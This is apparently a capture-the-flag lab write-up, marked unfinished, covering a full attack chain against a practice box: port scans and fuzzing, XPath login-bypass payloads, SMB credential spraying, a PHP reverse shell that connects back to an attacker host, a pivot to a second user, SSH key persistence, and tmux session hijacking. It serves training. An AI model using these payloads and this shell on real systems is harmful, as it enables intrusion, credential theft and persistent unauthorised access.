# coldvvars

**Status:** WIP / pending final flag closure.
**Note:** The chain covers recon, XPath injection bypass, shell, and local pivot, but final flag proof is not documented.

## Recon
```bash
nmap -sS -p- -n -Pn --min-rate 5000 --open --reason $TARGET -oN silent
nmap -sVC -p22,139,445,8080,8082 $TARGET -oN service
```

**Output**
```

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
8080/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
8082/tcp open  http        Node.js Express framework
```

## Enumeration
```bash
smbmap -H  $TARGET -u '' -p ''
feroxbuster -u http://$TARGET:8080 -w /usr/share/seclists/Discovery/Web-Content/big.txt
feroxbuster -u http://$TARGET:8082 -w /usr/share/seclists/Discovery/Web-Content/big.txt
```

**Output**
```bash
301      GET  http://10.130.191.119:8080/dev 
200      GET http://10.130.191.119:8082/login
```
### Fuzz the /dev web directory
```bash
ffuf -u http://$TARGET:8080/dev/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -e .php,.txt,.env
```
**Output**
``` 
.htpasswd 
.htpasswd.env 
.htpasswd.txt 
note.txt 
```

### XPath injection on the login panel with Burp Suite Intruder
> Capture traffic with the proxy and send to Intruder.
> Working payloads:
```
username=admin%22or%201%3d1%20or%20%22%22%3d%22&password=asds&submit=Login
username=&password=admin%22%20or%20%221%22%3d%221&submit=Login
```
**Output**
```
Username Password<br>Tove             Jani<br>Godzilla             KONGistheKING<br>SuperMan             snyderCut<br>ArthurMorgan             DeadEye<br>
```

### Four potential username/password pairs recovered

### SMB credential validation against port 445

```bash
netexec smb 10.130.191.119 -u users.txt -p passwords.txt --continue-on-success
```
**Output**
```
SMB         10.130.191.119  445    IP-10-130-191-119 [*] Unix - Samba (name:IP-10-130-191-119) (domain:eu-west-3.compute.internal) (signing:False) (SMBv1:None) (Null Auth:True)
SMB         10.130.191.119  445    IP-10-130-191-119 [+] eu-west-3.compute.internal\Tove:Jani (Guest)
SMB         10.130.191.119  445    IP-10-130-191-119 [+] eu-west-3.compute.internal\Godzilla:Jani (Guest)
SMB         10.130.191.119  445    IP-10-130-191-119 [+] eu-west-3.compute.internal\SuperMan:Jani (Guest)
SMB         10.130.191.119  445    IP-10-130-191-119 [-] eu-west-3.compute.internal\ArthurMorgan:Jani STATUS_LOGON_FAILURE
SMB         10.130.191.119  445    IP-10-130-191-119 [-] eu-west-3.compute.internal\ArthurMorgan:KONGistheKING STATUS_LOGON_FAILURE
SMB         10.130.191.119  445    IP-10-130-191-119 [-] eu-west-3.compute.internal\ArthurMorgan:snyderCut STATUS_LOGON_FAILURE
SMB         10.130.191.119  445    IP-10-130-191-119 [+] eu-west-3.compute.internal\ArthurMorgan:DeadEye
```

### Enumerate shares with valid credentials
```bash
smbmap -H  $TARGET -u 'ArthurMorgan' -p 'DeadEye'
```
**Output**
```
SECURED :READ, WRITE  Dev
```

### Read/write access to the SECURED share
```bash
 smbclient //$TARGET/SECURED -U 'ArthurMorgan%DeadEye'
```

### The share contains the same note.txt found via web fuzzing — uploading a PHP reverse shell to this share makes it accessible from the webroot

**Reverse Shell**
```
<?php
set_time_limit(0);
$ip = 'LHOST';  // Replace with attacker IP
$port = 4444;
$sock = fsockopen($ip, $port);
$descriptorspec = array(
    0 => $sock,
    1 => $sock,
    2 => $sock
);
$process = proc_open('/bin/sh', $descriptorspec, $pipes);
proc_close($process);
?>
```
### Upload the shell via SMB and trigger it from the web
```bash
nc -lvpn 4444
curl http://$TARGET/dev/rev.php 
```

Stabilise:
```bash
# What it does: spawn an interactive bash shell using Python.
# Why here: stabilize the raw netcat shell to allow for tab completion and job control.
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
reset
```

## Linux Enumeration
```bash
cat /etc/passwd
id
groups
sudo -l
```
### Navigate to /home — multiple user directories visible
```
/home/ArthurMorgan$ ls
ideas  user.txt
```
### SSH is also possible with ArthurMorgan's SMB credentials

### Local enumeration
```bash
cd /home/marston/app
ls
netstat -tulwn
printenv
```
**Output**
```
OPEN_PORT=4545
```
```bash
 nc -nlvp 4545
 # use option 4 and type:
 :!bash
 ## enter
```
### Now running as user marston
```bash 
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

### Add SSH key for persistence
```bash
echo "ssh-rsa AAAAB3N" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
ssh marston@$TARGET
```

### Privilege Escalation
```bash
# 1. Set TERM
stty rows 44 cols 102
# 2. List active tmux sessions
tmux ls
# 3. Attach to session 0
tmux attach -t 0
```

## Related Notes

- [nmap](../../../tools/recon/nmap.md)
- [smbmap](../../../tools/recon/smbmap.md)
- [smbclient](../../../tools/recon/smbclient.md)
- [netexec](../../../tools/recon/netexec.md)
- [feroxbuster](../../../tools/fuzz/feroxbuster.md)
- [ffuf](../../../tools/fuzz/ffuf.md)
- [curl](../../../tools/web/curl.md)
- [netcat](../../../tools/pivot/netcat.md)
- [XPath login injection](../../../exploits/web-auth/xpath-login-injection.md)
- [SMB writable webroot to PHP execution](../../../exploits/web-rce/smb-write-webroot-php-execution.md)
- [PHP proc_open reverse shell](../../../payloads/reverse-shells/php-proc-open.md)
- [Python PTY stabilization](../../../payloads/shell-stabilization/python-pty.md)
- [SSH authorized_keys persistence](../../../payloads/persistence/ssh-authorized-keys.md)
